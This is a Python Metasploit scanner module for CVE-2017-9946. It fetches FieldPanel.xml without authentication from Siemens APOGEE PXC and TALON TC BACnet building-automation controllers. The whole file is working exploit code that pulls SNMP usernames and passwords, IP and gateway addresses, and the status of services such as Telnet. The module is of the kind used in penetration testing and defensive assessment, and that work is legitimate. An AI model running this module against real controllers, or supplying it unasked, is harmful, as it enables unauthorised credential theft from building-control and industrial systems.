#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Siemens BACnet Field Panel Path Traversal Scanner.

Exploits a hidden directory on Siemens APOGEE PXC and TALON TC BACnet Automation
Controllers (all versions prior to V3.5). The module pulls **FieldPanel.xml** to
collect configuration and credential data without authentication.
"""
from __future__ import annotations

import logging
import socket
import struct
import xml.etree.ElementTree as ET
from typing import Any, Dict

from metasploit import module

# Third-party dependencies -----------------------------------------------------
dependencies_missing = False
try:
    import requests  # type: ignore
    import xmltodict  # noqa: F401  (unused for now, but handy for later work)
except ImportError:
    dependencies_missing = True

# -----------------------------------------------------------------------------
# Metasploit metadata
# -----------------------------------------------------------------------------
METADATA: Dict[str, Any] = {
    "name": "Siemens BACnet Field Panel Path Traversal",
    "description": (
        "This module exploits a hidden directory on Siemens APOGEE PXC BACnet "
        "Automation Controllers (all versions prior to V3.5) and TALON TC BACnet "
        "Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, "
        "the exploit lets an attacker bypass authentication and enumerate hidden "
        "directories on the embedded webserver."
    ),
    "authors": [
        "RoseSecurity",
    ],
    "date": "2022-05-23",
    "license": "MSF_LICENSE",
    "references": [
        {"type": "url", "ref": "https://sid.siemens.com/v/u/A6V10304985"},
        {"type": "cve", "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-9946"},
    ],
    "type": "single_scanner",
    "options": {
        "rhost": {
            "type": "string",
            "description": "Target address",
            "required": True,
            "default": None,
        },
    },
}

# XML element indexes mapped to human-readable labels (order matters).
XML_FIELDS = [
    (18, "Remote Site ID"),
    (26, "Building Level Network Name"),
    (27, "Site Name"),
    (28, "Hostname"),
    (30, "IP Address"),
    (32, "Gateway IP Address"),
    (57, "Maximum Transmission Size"),
    (60, "BACnet Device Name"),
    (62, "BACnet UDP Port"),
    (63, "Device Location"),
    (64, "Device Description"),
    (88, "Device Barcode"),
    (104, "Device Revision String"),
    (105, "Device Firmware"),
    (109, "Panel Key Name"),
    (148, "SNMP Username"),
    (149, "SNMP Private Password"),
    (150, "SNMP Authorization Password"),
]

# Service flags: (XML index, value that means "enabled").
SERVICE_FLAGS = {
    "Telnet": (48, 1),
    "Wireless": (84, 1),
    "Webserver": (103, 3),
}


def _hex_to_ip(hex_str: str) -> str:
    """Convert a hex-encoded IP address to dotted-quad notation."""
    return socket.inet_ntoa(struct.pack(">L", int(hex_str, 16)))


def run(args: Dict[str, Any]) -> None:  # noqa: D401  (Metasploit API requirement)
    """Metasploit entrypoint required by `module.run`."""
    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    if dependencies_missing:
        logging.error("Module dependency (requests) is missing, cannot continue")
        return

    try:
        resp = requests.get(
            f"http://{args['rhost']}/FieldPanel.xml",  # nosec B310 -- target is user-supplied
            verify=False,
            timeout=10,
        )
        resp.raise_for_status()
    except requests.exceptions.RequestException as exc:  # type: ignore[attr-defined]
        logging.error("%s", exc)
        return

    root = ET.fromstring(resp.content)

    # Standard XML fields -----------------------------------------------------
    for idx, label in XML_FIELDS:
        value = root[idx].text  # type: ignore[index]
        if idx in (30, 32):  # IPs are hex-encoded
            value = _hex_to_ip(value)  # type: ignore[arg-type]
        module.log(f"{label}: {value}")

    # Service flags -----------------------------------------------------------
    for service, (idx, enabled_val) in SERVICE_FLAGS.items():
        status = "Enabled" if int(root[idx].text) == enabled_val else "Disabled"  # type: ignore[index]
        module.log(f"{service} {status}")


if __name__ == "__main__":
    module.run(METADATA, run)
